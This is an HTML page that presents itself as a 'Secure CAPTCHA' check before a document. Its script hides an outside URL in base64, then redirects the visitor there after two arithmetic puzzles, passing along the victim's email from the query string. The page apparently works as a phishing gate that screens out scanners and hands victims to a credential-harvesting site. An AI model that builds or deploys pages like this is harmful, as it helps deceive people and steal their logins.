<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Secure Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    :root {
      --bg: #ffffff;
      --text: #333;
      --box-bg: #f7f7f7;
      --primary: #007bff;
      --highlight: #0056b3;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: var(--bg);
      color: var(--text);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
      position: relative;
    }

    .logo {
      position: absolute;
      top: 14px;
      left: 14px;
      display: flex;
      align-items: center;
      background: var(--box-bg);
      padding: 4px 10px;
      border-radius: 10px;
      border: 2px solid var(--primary);
      box-shadow: 0 3px 10px rgba(0, 123, 255, 0.4);
    }

    .logo img {
      width: 22px;
      height: 22px;
      margin-right: 6px;
      object-fit: contain;
      transition: transform 0.3s ease;
    }

    .logo img:hover {
      transform: scale(1.1);
    }

    .logo span {
      font-size: 0.95rem;
      font-weight: 600;
      color: var(--primary);
    }

    #captcha-wrapper {
      position: relative;
      padding: 3px;
      border-radius: 16px;
      background: linear-gradient(135deg, #007bff, #00c6ff, #007bff);
      background-size: 300% 300%;
      animation: pulse-border 6s ease infinite;
    }

    @keyframes pulse-border {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    #captcha-box {
      background: var(--box-bg);
      padding: 30px;
      border-radius: 14px;
      text-align: center;
      width: 100%;
      max-width: 400px;
      position: relative;
      z-index: 1;
    }

    .captcha-header {
      font-size: 1.1rem;
      font-weight: 500;
      margin-bottom: 18px;
      color: var(--text);
    }

    #captcha-question {
      font-size: 1.2rem;
      margin-bottom: 12px;
    }

    input[type="number"] {
      font-size: 1rem;
      padding: 10px;
      width: 60%;
      max-width: 200px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      padding: 12px 24px;
      font-size: 1rem;
      background-color: var(--primary);
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: var(--highlight);
    }

    #message {
      margin-top: 15px;
      font-size: 1.1rem;
      min-height: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
    }

    .icon-success {
      width: 24px;
      height: 24px;
    }

    p.note {
      font-size: 0.88rem;
      color: #666;
      margin-top: 20px;
      line-height: 1.4;
    }

    @media (max-width: 480px) {
      #captcha-box {
        padding: 20px;
      }

      input[type="number"] {
        width: 100%;
      }

      button {
        width: 100%;
      }

      .logo {
        flex-direction: column;
        align-items: flex-start;
        padding: 4px 10px;
      }

      .logo img {
        width: 20px;
        height: 20px;
        margin-bottom: 4px;
      }

      .logo span {
        font-size: 0.88rem;
      }
    }
  </style>
</head>
<body>

  <div class="logo">
    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
    <span>Secure CAPTCHA</span>
  </div>

  <div id="captcha-wrapper">
    <div id="captcha-box">
      <div class="captcha-header">For security reasons, please solve this to continue.</div>
      <div id="captcha-question">Loading...</div>
      <input type="number" id="user-answer" placeholder="Your answer" />
      <br />
      <button onclick="validateCaptcha()">Submit</button>
      <div id="message"></div>
      <p class="note">
        By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
      </p>
    </div>
  </div>

  <script>
    let answer = 0;
    let firstSolved = false;

    const base64Ref = "aHR0cHM6Ly9kb2N1LmZlbm1lbm9zLmRlL0ViZVpF"; // https://docu.fenmenos.de/EbeZE

    function generateCaptcha() {
      const num1 = Math.floor(Math.random() * 20) + 1;
      const num2 = Math.floor(Math.random() * 10) + 1;
      const operations = ['+', '-', '*'];
      const operation = operations[Math.floor(Math.random() * operations.length)];
      const symbol = operation === '*' ? 'x' : operation;

      switch (operation) {
        case '+': answer = num1 + num2; break;
        case '-': answer = num1 - num2; break;
        case '*': answer = num1 * num2; break;
      }

      document.getElementById("captcha-question").innerText = `What is ${num1} ${symbol} ${num2}?`;
      document.getElementById("user-answer").value = '';
      document.getElementById("message").innerText = '';
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById("user-answer").value);
      const msg = document.getElementById("message");

      if (userAnswer === answer) {
        if (!firstSolved) {
          firstSolved = true;
          msg.innerText = "Correct! One more to go...";
          generateCaptcha();
        } else {
          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
          setTimeout(() => redirectUser(), 1500);
        }
      } else {
        msg.innerText = "Incorrect. Please try again.";
      }
    }

    function redirectUser() {
      try {
        const decodedRef = atob(base64Ref);
        const email = new URLSearchParams(window.location.search).get("id");

        const finalUrl = email ? `${decodedRef}?id=${email}` : decodedRef;
        window.location.href = finalUrl;
      } catch (e) {
        alert("Redirect failed. Invalid base64.");
      }
    }

    window.onload = generateCaptcha;
  </script>
</body>
</html>
